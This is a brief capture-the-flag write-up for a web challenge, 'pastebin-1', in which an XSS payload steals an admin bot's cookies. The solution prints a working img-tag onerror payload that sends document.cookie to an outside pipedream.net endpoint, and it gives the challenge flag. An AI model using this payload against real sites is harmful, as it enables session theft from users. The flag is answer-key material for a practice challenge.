# web/pastebin-1
### BrownieInMotion

## Description
Ah, the classic pastebin. Can you get the admin's cookies?

pastebin-1.mc.ax

[Admin bot](https://admin-bot.mc.ax/pastebin-1)

[main.rs](Assets\main.rs)

## Solution
The site allows us to craft a webpage. Hence, this is most likely a XSS challenge.<br/>
We thus create a simple image that sends a request to our endpoint.<br/>
```html
<img src="https://*; script-src 'unsafe-inline'" onerror="var img = new Image(); img.src = 'https://6d8dab053d9ef5e7612246869dd7586e.m.pipedream.net?b='+document.cookie; document.body.appendChild(img);">
```
The cookie is appended as a query `b: flag=flag{d1dn7_n33d_70_b3_1n_ru57}`

> flag{d1dn7_n33d_70_b3_1n_ru57}